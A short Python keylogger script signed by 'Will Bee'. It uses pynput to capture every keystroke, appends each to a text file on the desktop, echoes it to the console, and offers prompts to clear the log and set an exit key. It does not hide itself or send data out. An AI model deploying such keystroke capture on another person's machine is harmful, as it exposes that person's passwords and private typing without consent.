from pynput.keyboard import Key, Listener
# import


location = "Desktop/keys.txt"
# Final location of keys.txt

Key_to_escape = Key.esc
# Key to exit program

def Special(keystr):
    sch = "Key." in keystr
    if sch:
        keystr = keystr[4:]
    return keystr, sch

def on_press(key):
    keystr = str(key)
    keystr = keystr.replace("'", "")

    keystr, spcqm = Special(keystr)

    if spcqm:
        print("[✓]:", keystr, (13 - len(keystr)) * " ", "[#]: key ID:", key)

    else:
        print("[✓]:", keystr, "             [#]: key ID:", key)
    
    try:
        fh = open(location, 'a')
        if spcqm:
            fh.write(" ")
        fh.write(keystr)
        if keystr == "enter":
            fh.write("\n")
        if spcqm:
            if keystr != "enter":
                fh.write(" ")
        fh.close()
    except:
        print("[!]: Failed with saving data")
    if key == Key_to_escape or str(key) == "<222>":
        print("[!]: Exiting...")
        exit()

def rewrite():
    print("[X]: Do you want to rewrite all saved keys?")
    print("[1]: Yes")
    print("[0]: No")
    r = int(input("[?]: Your option: "))
    print("")
    if r == 1:
        try:
            fh = open(location, 'w')
            fh.write("")
            fh.close()
            print("[✓]: Data deleted!")
            print("")
        except:
            print("[!]: Failed with saving data")
            print("")

def custom_exit(keytoexit):
    global Key_to_escape
    print("[!]:", keytoexit, "is now exit button!")
    Key_to_escape = keytoexit
    return False

def exiting():
    global Key_to_escape
    print("[X]: Do you want to use", Key_to_escape, "to exit?")
    print("[1]: Yes")
    print("[2]: Custom")
    print("[0]: No")
    r = int(input("[?]: Your option: "))
    print("")
    if r == 0:
        Key_to_escape = ""
    if r == 2:
        print("[!]: Listening...")
        with Listener(on_press=custom_exit) as listener:
            listener.join()

def main():
    print("\033c", end="")
    print("[-] _Made by: Will-Bee_ [-]")
    print("")
    rewrite()
    exiting()
    print("[!]: Listening...")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()


### BY WILL BEE ###
